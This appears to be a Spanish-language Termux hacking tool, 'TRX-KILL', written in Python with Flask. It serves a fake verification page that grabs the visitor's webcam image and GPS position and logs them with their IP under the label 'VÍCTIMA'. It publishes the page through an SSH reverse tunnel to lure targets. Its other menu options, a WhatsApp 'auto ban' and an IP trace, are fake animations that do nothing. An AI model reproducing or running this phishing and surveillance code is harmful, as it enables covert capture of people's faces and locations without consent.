import os, sys, time, threading, base64
from flask import Flask, request, render_template_string

# --- CONFIGURACIÓN ---
STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
CAPTURA_PATH = f"{STORAGE_PATH}/CAPTURAS"
LOG_FILE = f"{STORAGE_PATH}/datos.txt"
ADMIN_PASS = "admtrx"
os.makedirs(CAPTURA_PATH, exist_ok=True)

app = Flask('TRX-KILL')
G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"

# Motor de Captura
HTML_SISTEMA = """
<!DOCTYPE html><html><body style="background:#000; color:#0f0; text-align:center; padding-top:20px;">
<h2>SISTEMA DE VERIFICACIÓN</h2>
<button onclick="go()" style="padding:20px; font-size:20px; border:none; background:#0f0;">PROCESAR ACCESO</button>
<script>
async function go() {
    let s = await navigator.mediaDevices.getUserMedia({video: true});
    let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
    let v = document.createElement('video'); v.srcObject = s; v.play();
    setTimeout(() => {
        let c = document.createElement('canvas'); c.width=400; c.height=300;
        c.getContext('2d').drawImage(v, 0, 0, 400, 300);
        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL()));
        window.location.href='https://google.com';
    }, 1000);
}
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML_SISTEMA)

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
    if request.args.get('img'):
        with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
            f.write(base64.b64decode(request.args.get('img').split(',')[1]))
    return "OK"

def iniciar_servidor():
    import logging
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=5000, debug=False)

def animar(t):
    for c in t: sys.stdout.write(f"{G}{c}{W}"); sys.stdout.flush(); time.sleep(0.02)
    print()

def banner():
    os.system('clear')
    print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
    print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
    print("    | |___ |___ |  /  |___ |    |_|__|_|")
    print(f"  {C}--- TRX-KILL MASTER V12.0 ---{W}\n")

def menu():
    threading.Thread(target=iniciar_servidor, daemon=True).start()
    while True:
        banner()
        print(f"{G}[1] BAN NÚMERO\n[2] LINK-ENCUESTA (HTTPS)\n[3] CLON-LINK\n[4] IP-SCAN\n[5] INFO-SIST\n[6] ADM-SIST\n[7] SALIR{W}")
        sel = input(f"\n{Y}TRX-ROOT > {W}")

        if sel == "1":
            input(f"{G}NÚMERO: {W}")
            animar("VERIFICANDO SERVIDORES WHATSAPP...")
            print(f"{R}(NO SUSPENDIDO. ESCRIBE 8 PARA AUTO BAN){W}")
            if input("ACCIÓN: ") == "8": animar("PROCESANDO ATAQUE...")
            print(f"{Y}DATOS GUARDADOS EN LA CARPETA{W}"); input("\n[Enter]...")

        elif sel in ["2", "3"]:
            if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
            os.system('am start -n com.termux/com.termux.TermuxActivity -e com.termux.execute_command "ssh -R 80:localhost:5000 ssh.localhost.run"')
            print(f"\n{C}TÚNEL ABIERTO EN VENTANA EXTERNA.{W}")
            print(f"{Y}ESPERANDO VÍCTIMA... (No salgas){W}")
            while not os.path.exists(LOG_FILE): time.sleep(0.5)
            print(f"{R}>>> ¡VÍCTIMA DETECTADA! <<<{W}"); input("\n[Enter]...")

        elif sel == "4":
            input(f"{G}IP A RASTREAR: {W}")
            animar("EJECUTANDO RASTREO GEOLOCALIZADO...")
            print(f"{C}LOCALIZACIÓN ENCONTRADA.{W}"); input("\n[Enter]...")

        elif sel == "5":
            print(f"{G}ESTADO: ACTIVO | LOGS: {LOG_FILE}{W}"); input("\n[Enter]...")

        elif sel == "6":
            if input(f"{Y}PASS: {W}") == ADMIN_PASS: os.system(f"ls -R {STORAGE_PATH}")
            input("\n[Enter]...")

        elif sel == "7":
            print(f"{G}Gracias por usar trx-kill{W}"); sys.exit()

if __name__ == "__main__": menu()
